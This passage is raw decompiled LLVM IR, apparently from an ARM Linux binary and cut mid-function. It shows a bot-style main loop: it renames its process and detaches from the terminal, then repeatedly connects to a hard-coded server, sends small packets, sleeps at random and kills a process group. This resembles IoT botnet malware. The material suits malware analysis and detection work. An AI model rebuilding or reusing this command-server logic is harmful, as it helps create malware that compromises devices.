  store i8 0, i8* %v4_ff10, align 1
  %v2_ff14 = inttoptr i32 %v2_ff0c to i8*
  %v3_ff14 = call i32 @function_12d5c(i8* %v2_ff14, i32 %v2_feec)
  %v2_ff20 = call i32 @function_12dd4(i32 %v2_feec, i32 32)
  %v0_ff24 = call i32 @function_105b0()
  store i32 %v0_ff24, i32* @r7, align 4
  %v0_ff2c = load i32, i32* @r8, align 4
  %v1_ff2c = inttoptr i32 %v0_ff2c to i32*
  %v2_ff2c = load i32, i32* %v1_ff2c, align 4
  %v1_ff30 = inttoptr i32 %v2_ff2c to i8*
  %v2_ff30 = call i32 @function_12d34(i8* %v1_ff30)
  store i32 %v2_ff30, i32* %r4.global-to-local, align 4
  %v0_ff38 = load i32, i32* @r8, align 4
  %v1_ff38 = inttoptr i32 %v0_ff38 to i32*
  %v2_ff38 = load i32, i32* %v1_ff38, align 4
  %v1_ff3c = inttoptr i32 %v2_ff38 to i8*
  %v2_ff3c = call i32 @function_12d34(i8* %v1_ff3c)
  %v1_ff40 = sub i32 20, %v2_ff30
  store i32 %v2_ff3c, i32* @r5, align 4
  %v0_ff48 = load i32, i32* @r7, align 4
  %v2_ff4c = urem i32 %v0_ff48, %v1_ff40
  %v2_ff50 = add i32 %v2_ff4c, %v2_ff3c
  store i32 %v2_ff50, i32* @r4, align 4
  %v2_ff5c = call i32 @function_10664(i32 %v2_feec, i32 %v2_ff50)
  %v1_ff64 = load i32, i32* @r4, align 4
  %v2_ff64 = add i32 %v1_ff64, %v2_fefc
  store i32 %v2_ff64, i32* %r3.global-to-local, align 4
  %v0_ff68 = load i32, i32* @sl, align 4
  %v1_ff68 = trunc i32 %v0_ff68 to i8
  %v3_ff68 = add i32 %v2_ff64, -72
  %v4_ff68 = inttoptr i32 %v3_ff68 to i8*
  store i8 %v1_ff68, i8* %v4_ff68, align 1
  %v5_ff74 = call i32 @prctl(i32 15, i32 %v2_feec, i32 %v2_ff64, i32 %v2_ff64, i32 ptrtoint (i32* @0 to i32))
  %v1_ff7c = call i32 @function_12280(i32 5)
  %v3_ff8c = call i32 @function_1219c(i32 5, i32* nonnull %stack_var_-44)
  %v3_ff90 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ff90, i32* %r2.global-to-local, align 4
  %v3_ff9c = inttoptr i32 %v3_ff8c to i32*
  %v4_ff9c = call i32 @write(i32 1, i32* %v3_ff9c, i32 %v3_ff90)
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_ffac = call i32 @write(i32 ptrtoint (i32* @global_var_136d4.179 to i32), i32* inttoptr (i32 1 to i32*), i32 1)
  %v1_ffb4 = call i32 @function_121c8(i32 5)
  %v1_ffb8 = call i32 @function_b070(i32 %v1_ffb4)
  %v1_ffbc = call i32 @function_f828(i32 %v1_ffb8)
  %v1_ffc0 = call i32 @function_fd0c(i32 %v1_ffbc)
  %v0_ffc4 = call i32 @fork()
  %v1_ffc8 = load i32, i32* @sl, align 4
  %v7_ffcc = icmp sgt i32 %v0_ffc4, %v1_ffc8
  br i1 %v7_ffcc, label %dec_label_pc_ffd0, label %dec_label_pc_10014

dec_label_pc_ffd0:                                ; preds = %dec_label_pc_feb8
  %v2_ffd8 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_ffd8, i32* %r4.global-to-local, align 4
  store i32 %v6_fdf8, i32* %r5.global-to-local, align 4
  store i32 %v9_fdf8, i32* %r6.global-to-local, align 4
  store i32 %v15_fdf8, i32* %r8.global-to-local, align 4
  ret i32 0

dec_label_pc_ffdc:                                ; preds = %dec_label_pc_fdf8
  %v0_ffdc = load i32, i32* @r8, align 4
  %v1_ffdc = add i32 %v0_ffdc, 4
  %v2_ffdc = inttoptr i32 %v1_ffdc to i32*
  %v3_ffdc = load i32, i32* %v2_ffdc, align 4
  %v1_ffe0 = inttoptr i32 %v3_ffdc to i8*
  %v2_ffe0 = call i32 @function_12d34(i8* %v1_ffe0)
  %v8_ffe8 = icmp sgt i32 %v2_ffe0, 31
  br i1 %v8_ffe8, label %dec_label_pc_feb8, label %dec_label_pc_ffec

dec_label_pc_ffec:                                ; preds = %dec_label_pc_ffdc
  %v0_ffec = load i32, i32* @r8, align 4
  %v1_ffec = add i32 %v0_ffec, 4
  %v2_ffec = inttoptr i32 %v1_ffec to i32*
  %v3_ffec = load i32, i32* %v2_ffec, align 4
  store i32 %v2_fe98, i32* @r0, align 4
  %v2_fff4 = bitcast i32* %stack_var_-140 to i8*
  %v3_fff4 = call i32 @function_12d5c(i8* %v2_fff4, i32 %v3_ffec)
  %v0_fff8 = load i32, i32* @r8, align 4
  %v1_fff8 = add i32 %v0_fff8, 4
  %v2_fff8 = inttoptr i32 %v1_fff8 to i32*
  %v3_fff8 = load i32, i32* %v2_fff8, align 4
  store i32 %v3_fff8, i32* %r4.global-to-local, align 4
  %v1_10000 = inttoptr i32 %v3_fff8 to i8*
  %v2_10000 = call i32 @function_12d34(i8* %v1_10000)
  %v2_1000c = call i32 @function_12dd4(i32 %v3_fff8, i32 %v2_10000)
  br label %dec_label_pc_feb8

dec_label_pc_10014:                               ; preds = %dec_label_pc_feb8
  %v1_10014 = call i32 @setsid()
  %v0_1001c = load i32, i32* @sl, align 4
  %v1_10020 = call i32 @close(i32 %v0_1001c)
  %v1_10028 = call i32 @close(i32 1)
  %v1_10030 = call i32 @close(i32 2)
  %v1_10034 = call i32 @function_b070(i32 %v1_10030)
  %v1_10038 = call i32 @function_f828(i32 %v1_10034)
  %v1_1003c = call i32 @function_fd0c(i32 %v1_10038)
  %v1_10040 = call i32 @function_109cc(i32 %v1_1003c)
  store i32 ptrtoint (i32* @global_var_1c190.181 to i32), i32* @fp, align 4
  %v2_10050 = ptrtoint i32* %stack_var_-396 to i32
  store i32 %v2_10050, i32* @r6, align 4
  %v2_10054 = ptrtoint i32* %stack_var_-524 to i32
  store i32 %v2_10054, i32* @r7, align 4
  %tmp44 = bitcast i32* %stack_var_-396 to %_TYPEDEF_fd_set*
  %tmp45 = bitcast i32* %stack_var_-524 to %_TYPEDEF_fd_set*
  %tmp46 = bitcast i32* %stack_var_-60 to %timeval*
  %v7_10380 = bitcast i8** %stack_var_-38 to i32*
  %v2_104dc = ptrtoint i32* %stack_var_-1548 to i32
  %v2_10390 = ptrtoint i32* %stack_var_-48 to i32
  %v1_10434 = bitcast i32* %stack_var_-140 to i8*
  %tmp48 = bitcast i32* %stack_var_-76 to %sockaddr*
  br label %dec_label_pc_10058

dec_label_pc_10058:                               ; preds = %dec_label_pc_10058.backedge, %dec_label_pc_10014
  %v2_1006052 = phi i32 [ %v2_1006052.pre, %dec_label_pc_10058.backedge ], [ %v2_10050, %dec_label_pc_10014 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v4_1006054 = inttoptr i32 %v2_1006052 to i32*
  store i32 0, i32* %v4_1006054, align 4
  %v0_1006455 = load i32, i32* %r3.global-to-local, align 4
  %v1_1006456 = add i32 %v0_1006455, 4
  store i32 %v1_1006456, i32* %r3.global-to-local, align 4
  %v7_1006857 = icmp eq i32 %v1_1006456, 128
  br i1 %v7_1006857, label %dec_label_pc_10070, label %dec_label_pc_10060.dec_label_pc_10060_crit_edge

dec_label_pc_10060.dec_label_pc_10060_crit_edge:  ; preds = %dec_label_pc_10058, %dec_label_pc_10060.dec_label_pc_10060_crit_edge
  %v1_1006458 = phi i32 [ %v1_10064, %dec_label_pc_10060.dec_label_pc_10060_crit_edge ], [ %v1_1006456, %dec_label_pc_10058 ]
  %v0_10060.pre = load i32, i32* %r2.global-to-local, align 4
  %v2_10060 = load i32, i32* @r6, align 4
  %v3_10060 = add i32 %v2_10060, %v1_1006458
  %v4_10060 = inttoptr i32 %v3_10060 to i32*
  store i32 %v0_10060.pre, i32* %v4_10060, align 4
  %v0_10064 = load i32, i32* %r3.global-to-local, align 4
  %v1_10064 = add i32 %v0_10064, 4
  store i32 %v1_10064, i32* %r3.global-to-local, align 4
  %v7_10068 = icmp eq i32 %v1_10064, 128
  br i1 %v7_10068, label %dec_label_pc_10070, label %dec_label_pc_10060.dec_label_pc_10060_crit_edge

dec_label_pc_10070:                               ; preds = %dec_label_pc_10060.dec_label_pc_10060_crit_edge, %dec_label_pc_10058
  %v0_10070 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_10070, i32* %r3.global-to-local, align 4
  store i32 %v0_10070, i32* @r4, align 4
  %v2_1007859 = load i32, i32* @r7, align 4
  %v3_1007860 = add i32 %v2_1007859, %v0_10070
  %v4_1007861 = inttoptr i32 %v3_1007860 to i32*
  store i32 %v0_10070, i32* %v4_1007861, align 4
  %v0_1007c62 = load i32, i32* %r3.global-to-local, align 4
  %v1_1007c63 = add i32 %v0_1007c62, 4
  store i32 %v1_1007c63, i32* %r3.global-to-local, align 4
  %v7_1008064 = icmp eq i32 %v1_1007c63, 128
  br i1 %v7_1008064, label %dec_label_pc_10088, label %dec_label_pc_10078.dec_label_pc_10078_crit_edge

dec_label_pc_10078.dec_label_pc_10078_crit_edge:  ; preds = %dec_label_pc_10070, %dec_label_pc_10078.dec_label_pc_10078_crit_edge
  %v1_1007c65 = phi i32 [ %v1_1007c, %dec_label_pc_10078.dec_label_pc_10078_crit_edge ], [ %v1_1007c63, %dec_label_pc_10070 ]
  %v0_10078.pre = load i32, i32* @r4, align 4
  %v2_10078 = load i32, i32* @r7, align 4
  %v3_10078 = add i32 %v2_10078, %v1_1007c65
  %v4_10078 = inttoptr i32 %v3_10078 to i32*
  store i32 %v0_10078.pre, i32* %v4_10078, align 4
  %v0_1007c = load i32, i32* %r3.global-to-local, align 4
  %v1_1007c = add i32 %v0_1007c, 4
  store i32 %v1_1007c, i32* %r3.global-to-local, align 4
  %v7_10080 = icmp eq i32 %v1_1007c, 128
  br i1 %v7_10080, label %dec_label_pc_10088, label %dec_label_pc_10078.dec_label_pc_10078_crit_edge

dec_label_pc_10088:                               ; preds = %dec_label_pc_10078.dec_label_pc_10078_crit_edge, %dec_label_pc_10070
  store i32 ptrtoint (i32* @global_var_1c18c.164 to i32), i32* %r2.global-to-local, align 4
  %v2_1008c = load i32, i32* @global_var_1c18c.164, align 4
  %v7_10090 = icmp eq i32 %v2_1008c, -1
  br i1 %v7_10090, label %dec_label_pc_100bc, label %dec_label_pc_10098

dec_label_pc_10098:                               ; preds = %dec_label_pc_10088
  %v3_10098 = udiv i32 %v2_1008c, 32
  %v3_1009c = mul nuw nsw i32 %v3_10098, 4
  %v2_100a4 = add i32 %v3_1009c, %v2_fefc
  store i32 %v2_100a4, i32* %r3.global-to-local, align 4
  %v1_100a8 = add i32 %v2_100a4, -360
  %v2_100a8 = inttoptr i32 %v1_100a8 to i32*
  %v3_100a8 = load i32, i32* %v2_100a8, align 4
  %v1_100ac = urem i32 %v2_1008c, 32
  %v7_100b4 = shl i32 1, %v1_100ac
  %v8_100b4 = or i32 %v3_100a8, %v7_100b4
  store i32 %v8_100b4, i32* %r2.global-to-local, align 4
  store i32 %v8_100b4, i32* %v2_100a8, align 4
  br label %dec_label_pc_100bc

dec_label_pc_100bc:                               ; preds = %dec_label_pc_10088, %dec_label_pc_10098
  %v2_100bc = load i32, i32* @global_var_1c190.181, align 4
  store i32 %v2_100bc, i32* %r3.global-to-local, align 4
  %v7_100c0 = icmp eq i32 %v2_100bc, -1
  store i32 ptrtoint (i32* @global_var_1c190.181 to i32), i32* %r8.global-to-local, align 4
  br i1 %v7_100c0, label %dec_label_pc_102f8, label %dec_label_pc_100cc

dec_label_pc_100cc:                               ; preds = %dec_label_pc_100bc, %dec_label_pc_102f8, %.thread
  store i32 ptrtoint (i8** @global_var_1c1d0.184 to i32), i32* %r2.global-to-local, align 4
  %v2_100d0 = load i8, i8* bitcast (i8** @global_var_1c1d0.184 to i8*), align 4
  %v2_100d4 = icmp eq i8 %v2_100d0, 0
  %v2_10214 = load i32, i32* @global_var_1c190.181, align 4
  %v3_10218 = udiv i32 %v2_10214, 32
  store i32 %v3_10218, i32* %r3.global-to-local, align 4
  br i1 %v2_100d4, label %dec_label_pc_10214, label %dec_label_pc_100dc

dec_label_pc_100dc:                               ; preds = %dec_label_pc_100cc
  %v3_100e4 = mul nuw nsw i32 %v3_10218, 4
  %v2_100ec = add i32 %v3_100e4, %v2_fefc
  store i32 %v2_100ec, i32* %r3.global-to-local, align 4
  %v1_100f0 = add i32 %v2_100ec, -488
  %v2_100f0 = inttoptr i32 %v1_100f0 to i32*
  %v3_100f0 = load i32, i32* %v2_100f0, align 4
  %v1_100f4 = urem i32 %v2_10214, 32
  %v7_100fc = shl i32 1, %v1_100f4
  %v8_100fc = or i32 %v3_100f0, %v7_100fc
  store i32 %v8_100fc, i32* %r2.global-to-local, align 4
  store i32 %v8_100fc, i32* %v2_100f0, align 4
  br label %dec_label_pc_10104

dec_label_pc_10104:                               ; preds = %dec_label_pc_10214, %dec_label_pc_100dc
  %v2_10108 = load i32, i32* @global_var_1c18c.164, align 4
  %v2_1010c = load i32, i32* @global_var_1c190.181, align 4
  store i32 %v2_1010c, i32* %r3.global-to-local, align 4
  %v5_10118 = icmp slt i32 %v2_10108, %v2_1010c
  br i1 %v5_10118, label %bb, label %bb49

bb:                                               ; preds = %dec_label_pc_10104
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_10104, %bb
  %v0_10130 = phi i32 [ %v2_10108, %dec_label_pc_10104 ], [ %v2_1010c, %bb ]
  store i32 10, i32* %stack_var_-60, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10130 = add i32 %v0_10130, 1
  store i32 %v2_10054, i32* %r2.global-to-local, align 4
  %v13_10144 = call i32 @select(i32 %v1_10130, %_TYPEDEF_fd_set* %tmp44, %_TYPEDEF_fd_set* %tmp45, %_TYPEDEF_fd_set* null, %timeval* %tmp46)
  %v8_10148 = icmp eq i32 %v13_10144, -1
  store i32 %v13_10144, i32* %r3.global-to-local, align 4
  br i1 %v8_10148, label %dec_label_pc_10058.backedge, label %dec_label_pc_10154

dec_label_pc_10154:                               ; preds = %bb49
  %v14_10144 = trunc i32 %v13_10144 to i8
  %v3_10154 = icmp eq i8 %v14_10144, 0
  br i1 %v3_10154, label %dec_label_pc_1015c, label %dec_label_pc_1017c

dec_label_pc_1015c:                               ; preds = %dec_label_pc_10154
  %v0_1015c = load i32, i32* @sl, align 4
  %v6_10168 = inttoptr i32 %v13_10144 to i8*
  store i8* %v6_10168, i8** %stack_var_-38, align 4
  %v2_1016c = srem i32 %v0_1015c, 6
  %v2_10170 = icmp eq i32 %v2_1016c, 0
  %v1_10174 = add i32 %v0_1015c, 1
  store i32 %v1_10174, i32* @sl, align 4
  br i1 %v2_10170, label %dec_label_pc_10368, label %dec_label_pc_1017c

dec_label_pc_1017c:                               ; preds = %dec_label_pc_10154, %dec_label_pc_1015c, %dec_label_pc_10368
  store i32 ptrtoint (i32* @global_var_1c18c.164 to i32), i32* %r2.global-to-local, align 4
  %v2_10180 = load i32, i32* @global_var_1c18c.164, align 4
  %v7_10184 = icmp eq i32 %v2_10180, -1
  br i1 %v7_10184, label %dec_label_pc_101b0, label %dec_label_pc_1018c

dec_label_pc_1018c:                               ; preds = %dec_label_pc_1017c
  %v3_1018c = udiv i32 %v2_10180, 32
  %v3_10190 = mul nuw nsw i32 %v3_1018c, 4
  store i32 %v2_fefc, i32* @ip, align 4
  %v2_10198 = add i32 %v3_10190, %v2_fefc
  store i32 %v2_10198, i32* %r3.global-to-local, align 4
  %v1_1019c = add i32 %v2_10198, -360
  %v2_1019c = inttoptr i32 %v1_1019c to i32*
  %v3_1019c = load i32, i32* %v2_1019c, align 4
  %v1_101a0 = urem i32 %v2_10180, 32
  %v6_101a4 = lshr i32 %v3_1019c, %v1_101a0
  store i32 %v6_101a4, i32* %r2.global-to-local, align 4
  %v1_101a8 = urem i32 %v6_101a4, 2
  %v2_101a8 = icmp eq i32 %v1_101a8, 0
  store i1 %v2_101a8, i1* @cpsr_z, align 1
  br i1 %v2_101a8, label %dec_label_pc_101b0, label %dec_label_pc_103e4

dec_label_pc_101b0:                               ; preds = %dec_label_pc_1018c, %dec_label_pc_1017c
  store i32 ptrtoint (i8** @global_var_1c1d0.184 to i32), i32* %r3.global-to-local, align 4
  %v2_101b4 = load i8, i8* bitcast (i8** @global_var_1c1d0.184 to i8*), align 4
  %v3_101b4 = zext i8 %v2_101b4 to i32
  store i32 %v3_101b4, i32* %r4.global-to-local, align 4
  %v2_101b8 = icmp eq i8 %v2_101b4, 0
  %v2_10240 = load i32, i32* @global_var_1c190.181, align 4
  br i1 %v2_101b8, label %dec_label_pc_10240, label %dec_label_pc_101c0

dec_label_pc_101c0:                               ; preds = %dec_label_pc_101b0
  %v3_101c4 = udiv i32 %v2_10240, 32
  %v3_101cc = mul nuw nsw i32 %v3_101c4, 4
  %v2_101d0 = add i32 %v3_101cc, %v2_fefc
  store i32 %v2_101d0, i32* %r3.global-to-local, align 4
  %v1_101d4 = add i32 %v2_101d0, -488
  %v2_101d4 = inttoptr i32 %v1_101d4 to i32*
  %v3_101d4 = load i32, i32* %v2_101d4, align 4
  %v1_101d8 = urem i32 %v2_10240, 32
  %v6_101dc = lshr i32 %v3_101d4, %v1_101d8
  store i32 %v6_101dc, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_1c1d0.184 to i32), i32* %r3.global-to-local, align 4
  %v1_101e8 = urem i32 %v6_101dc, 2
  %v2_101e8 = icmp eq i32 %v1_101e8, 0
  store i8 0, i8* bitcast (i8** @global_var_1c1d0.184 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_1c190.181 to i32), i32* @r5, align 4
  br i1 %v2_101e8, label %dec_label_pc_101f8, label %dec_label_pc_10388

dec_label_pc_101f8:                               ; preds = %dec_label_pc_101c0
  %v1_101fc = icmp ne i32 %v2_10240, -1
  call void @__pseudo_cond_branch(i1 %v1_101fc, i32 ptrtoint (i32* @global_var_8d50.77 to i32))
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_10204 = load i32, i32* @r5, align 4
  %v2_10204 = inttoptr i32 %v1_10204 to i32*
  store i32 -1, i32* %v2_10204, align 4
  %v1_1020c = call i32 @sleep(i32 1)
  br label %dec_label_pc_10058.backedge

dec_label_pc_10214:                               ; preds = %dec_label_pc_100cc
  store i32 %v2_fefc, i32* %r2.global-to-local, align 4
  %v3_10220 = mul nuw nsw i32 %v3_10218, 4
  %v2_10224 = add i32 %v3_10220, %v2_fefc
  store i32 %v2_10224, i32* %r3.global-to-local, align 4
  %v1_10228 = add i32 %v2_10224, -360
  %v2_10228 = inttoptr i32 %v1_10228 to i32*
  %v3_10228 = load i32, i32* %v2_10228, align 4
  %v1_1022c = urem i32 %v2_10214, 32
  %v7_10234 = shl i32 1, %v1_1022c
  %v8_10234 = or i32 %v3_10228, %v7_10234
  store i32 %v8_10234, i32* %r2.global-to-local, align 4
  store i32 %v8_10234, i32* %v2_10228, align 4
  br label %dec_label_pc_10104

dec_label_pc_10240:                               ; preds = %dec_label_pc_101b0
  %v7_10244 = icmp eq i32 %v2_10240, -1
  store i32 ptrtoint (i32* @global_var_1c190.181 to i32), i32* @r5, align 4
  br i1 %v7_10244, label %dec_label_pc_10058.backedge, label %dec_label_pc_10250

dec_label_pc_10250:                               ; preds = %dec_label_pc_10240
  %v3_10250 = udiv i32 %v2_10240, 32
  %v3_10254 = mul nuw nsw i32 %v3_10250, 4
  %v2_1025c = add i32 %v3_10254, %v2_fefc
  store i32 %v2_1025c, i32* %r3.global-to-local, align 4
  %v1_10260 = add i32 %v2_1025c, -360
  %v2_10260 = inttoptr i32 %v1_10260 to i32*
  %v3_10260 = load i32, i32* %v2_10260, align 4
  %v1_10264 = urem i32 %v2_10240, 32
  %v6_10268 = lshr i32 %v3_10260, %v1_10264
  store i32 %v6_10268, i32* %r2.global-to-local, align 4
  %v1_1026c = urem i32 %v6_10268, 2
  %v2_1026c = icmp eq i32 %v1_1026c, 0
  br i1 %v2_1026c, label %dec_label_pc_10058.backedge, label %dec_label_pc_10274

dec_label_pc_10274:                               ; preds = %dec_label_pc_10250
  %v6_10274 = inttoptr i32 %v3_101b4 to i8*
  store i8* %v6_10274, i8** %stack_var_-38, align 4
  %v0_1027c = call i32* @__errno_location()
  %v1_1027c = ptrtoint i32* %v0_1027c to i32
  %v0_10280 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10280, i32* %v0_1027c, align 4
  store i32 %v1_1027c, i32* @r8, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_10294 = load i32, i32* @global_var_1c190.181, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v5_102a0 = call i32 @recv(i32 %v2_10294, i32* %v7_10380, i32 2, i32 16386)
  %v7_102a4 = icmp eq i32 %v5_102a0, -1
  br i1 %v7_102a4, label %dec_label_pc_10494, label %dec_label_pc_102ac

dec_label_pc_102ac:                               ; preds = %dec_label_pc_10274
  %v2_102ac = icmp eq i32 %v5_102a0, 0
  br i1 %v2_102ac, label %dec_label_pc_104a4, label %dec_label_pc_102b4

dec_label_pc_102b4:                               ; preds = %dec_label_pc_102ac
  %v3_102b4 = load i8*, i8** %stack_var_-38, align 4
  %v4_102b4 = ptrtoint i8* %v3_102b4 to i32
  store i32 %v3_101b4, i32* %r3.global-to-local, align 4
  %v4_102bc = mul nuw nsw i32 %v3_101b4, 256
  %v5_102bc = or i32 %v4_102b4, %v4_102bc
  store i32 %v5_102bc, i32* %r2.global-to-local, align 4
  %v7_102bc = icmp eq i32 %v5_102bc, 0
  br i1 %v7_102bc, label %dec_label_pc_10564, label %dec_label_pc_102c4

dec_label_pc_102c4:                               ; preds = %dec_label_pc_102b4
  %v1_102c4 = mul i32 %v4_102b4, 256
  %v3_102c8 = and i32 %v1_102c4, 65280
  %v4_102cc = udiv i32 %v5_102bc, 256
  %v5_102cc = or i32 %v3_102c8, %v4_102cc
  %v6_102cc = trunc i32 %v4_102cc to i8
  store i32 %v5_102cc, i32* %r2.global-to-local, align 4
  %v4_102d0 = udiv i32 %v5_102bc, 65536
  store i32 %v4_102d0, i32* %r3.global-to-local, align 4
  %v3_102d4 = icmp slt i8 %v6_102cc, 0
  %v7_102dc = inttoptr i32 %v4_102cc to i8*
  store i8* %v7_102dc, i8** %stack_var_-38, align 4
  br i1 %v3_102d4, label %dec_label_pc_102e4, label %dec_label_pc_104d4

dec_label_pc_102e4:                               ; preds = %dec_label_pc_102c4
  %v2_102e4 = load i32, i32* @global_var_1c190.181, align 4
  %v1_102e8 = call i32 @close(i32 %v2_102e4)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_102f0 = load i32, i32* @r5, align 4
  %v2_102f0 = inttoptr i32 %v1_102f0 to i32*
  store i32 -1, i32* %v2_102f0, align 4
  br label %dec_label_pc_10058.backedge

dec_label_pc_10058.backedge:                      ; preds = %dec_label_pc_102e4, %dec_label_pc_103bc, %dec_label_pc_10480, %dec_label_pc_104a4, %dec_label_pc_10558, %dec_label_pc_10564, %dec_label_pc_101f8, %dec_label_pc_10430, %bb51, %dec_label_pc_10504, %bb49, %dec_label_pc_10240, %dec_label_pc_10250, %dec_label_pc_10494
  %v2_1006052.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_10058

dec_label_pc_102f8:                               ; preds = %dec_label_pc_100bc
  %v0_10300 = load i32, i32* @r4, align 4
  store i32 %v0_10300, i32* %r2.global-to-local, align 4
  %v3_10304 = call i32 @socket(i32 2, i32 1, i32 %v0_10300)
  %v7_10308 = icmp eq i32 %v3_10304, -1
  store i32 %v3_10304, i32* %r5.global-to-local, align 4
  %v1_10310 = load i32, i32* %r8.global-to-local, align 4
  %v2_10310 = inttoptr i32 %v1_10310 to i32*
  store i32 %v3_10304, i32* %v2_10310, align 4
  br i1 %v7_10308, label %dec_label_pc_100cc, label %dec_label_pc_10318

dec_label_pc_10318:                               ; preds = %dec_label_pc_102f8
  %v0_10318 = load i32, i32* @r4, align 4
  store i32 %v0_10318, i32* %r2.global-to-local, align 4
  %v2_10320 = call i32 (i32, i32, ...) @fcntl(i32 %v3_10304, i32 3)
  %v1_10328 = or i32 %v2_10320, 2048
  store i32 %v1_10328, i32* %r2.global-to-local, align 4
  %v0_1032c = load i32, i32* %r5.global-to-local, align 4
  %v2_10330 = call i32 (i32, i32, ...) @fcntl(i32 %v0_1032c, i32 4)
  store i32 ptrtoint (i32* @global_var_1c194.156 to i32), i32* %r2.global-to-local, align 4
  %v2_10338 = load i32, i32* @global_var_1c194.156, align 4
  store i32 %v2_10338, i32* %r3.global-to-local, align 4
  %v2_1033c = icmp eq i32 %v2_10338, 0
  br i1 %v2_1033c, label %.thread, label %bb50

bb50:                                             ; preds = %dec_label_pc_10318
  call void @__pseudo_branch(i32 ptrtoint (i32* @global_var_12fec.185 to i32))
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_10318, %bb50
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_10350 = load i32, i32* @global_var_1c190.181, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i8 1, i8* bitcast (i8** @global_var_1c1d0.184 to i8*), align 4
  %v5_10360 = call i32 @connect(i32 %v2_10350, %sockaddr* bitcast (%sockaddr** @global_var_1c224.158 to %sockaddr*), i32 16)
  br label %dec_label_pc_100cc

dec_label_pc_10368:                               ; preds = %dec_label_pc_1015c
  %v2_10370 = load i32, i32* @global_var_1c190.181, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v8_10380 = call i32 @send(i32 %v2_10370, i32* nonnull %v7_10380, i32 2, i32 16384)
  br label %dec_label_pc_1017c

dec_label_pc_10388:                               ; preds = %dec_label_pc_101c0
  store i32 4, i32* @r4, align 4
  store i32 %v2_10390, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-48, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-52, align 4
  %v8_103ac = call i32 @getsockopt(i32 %v2_10240, i32 1, i32 4, i32* nonnull %stack_var_-48, i32* nonnull %stack_var_-52)
  %v3_103b0 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_103b0, i32* %r3.global-to-local, align 4
  %v2_103b4 = icmp eq i32 %v3_103b0, 0
  br i1 %v2_103b4, label %dec_label_pc_10430, label %dec_label_pc_103bc

dec_label_pc_103bc:                               ; preds = %dec_label_pc_10388
  %v2_103bc = load i32, i32* @global_var_1c190.181, align 4
  %v1_103c0 = call i32 @close(i32 %v2_103bc)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_103c8 = load i32, i32* @r5, align 4
  %v2_103c8 = inttoptr i32 %v1_103c8 to i32*
  store i32 -1, i32* %v2_103c8, align 4
  %v0_103cc = call i32 @function_105b0()
  %v2_103d4 = urem i32 %v0_103cc, 10
  %v1_103d8 = add nuw nsw i32 %v2_103d4, 1
  %v1_103dc = call i32 @sleep(i32 %v1_103d8)
  br label %dec_label_pc_10058.backedge

dec_label_pc_103e4:                               ; preds = %dec_label_pc_1018c
  %v1_10410 = sub i32 0, %v1_10014
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 %v2_10390, i32* %r2.global-to-local, align 4
  store i32 16, i32* %stack_var_-48, align 4
  %v8_103fc = call i32 @accept(i32 %v2_10180, %sockaddr* %tmp48, i32* nonnull %stack_var_-48)
  %v1_10400 = call i32 @function_10730(i32 %v8_103fc)
  %v1_10404 = call i32 @function_f294(i32 %v1_10400)
  store i32 %v1_10014, i32* %r2.global-to-local, align 4
  %v2_10414 = call i32 @kill(i32 %v1_10410, i32 9)
  store i32 ptrtoint (i32* @global_var_1c1cc.169 to i32), i32* %r3.global-to-local, align 4
  %v2_1041c = load i32, i32* @global_var_1c1cc.169, align 4
  %v2_10420 = icmp eq i32 %v2_1041c, 0
  br i1 %v2_10420, label %dec_label_pc_10428, label %dec_label_pc_104c8

dec_label_pc_10428:                               ; preds = %dec_label_pc_103e4, %dec_label_pc_104c8
  call void @exit(i32 0)
  unreachable

dec_label_pc_10430:                               ; preds = %dec_label_pc_10388
  %v2_10434 = call i32 @function_12d34(i8* %v1_10434)
  %sext = mul i32 %v2_10434, 16777216
  %v1_10438 = sdiv i32 %sext, 16777216
  %v7_10438 = inttoptr i32 %v1_10438 to i8*
  store i8* %v7_10438, i8** %stack_var_-38, align 4
  %v0_1043c = call i32 @function_12fec()
  store i32 %v0_1043c, i32* @global_var_1c21c.135, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10450 = load i32, i32* @r4, align 4
  store i32 %v0_10450, i32* %r2.global-to-local, align 4
  %v0_10454 = load i32, i32* @r5, align 4
  %v1_10454 = inttoptr i32 %v0_10454 to i32*
  %v2_10454 = load i32, i32* %v1_10454, align 4
  %v5_10458 = call i32 @send(i32 %v2_10454, i32* nonnull @global_var_136d8.188, i32 %v0_10450, i32 16384)
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_10464 = load i32, i32* @r5, align 4
  %v1_10464 = inttoptr i32 %v0_10464 to i32*
  %v2_10464 = load i32, i32* %v1_10464, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_10470 = call i32 @send(i32 %v2_10464, i32* %v7_10380, i32 1, i32 16384)
  %v3_10474 = load i8*, i8** %stack_var_-38, align 4
  %v4_10474 = ptrtoint i8* %v3_10474 to i32
  store i32 %v4_10474, i32* %r2.global-to-local, align 4
  %v3_10478 = icmp eq i8* %v3_10474, null
  br i1 %v3_10478, label %dec_label_pc_10058.backedge, label %dec_label_pc_10480

dec_label_pc_10480:                               ; preds = %dec_label_pc_10430
  %v0_10480 = load i32, i32* @r5, align 4
  %v1_10480 = inttoptr i32 %v0_10480 to i32*
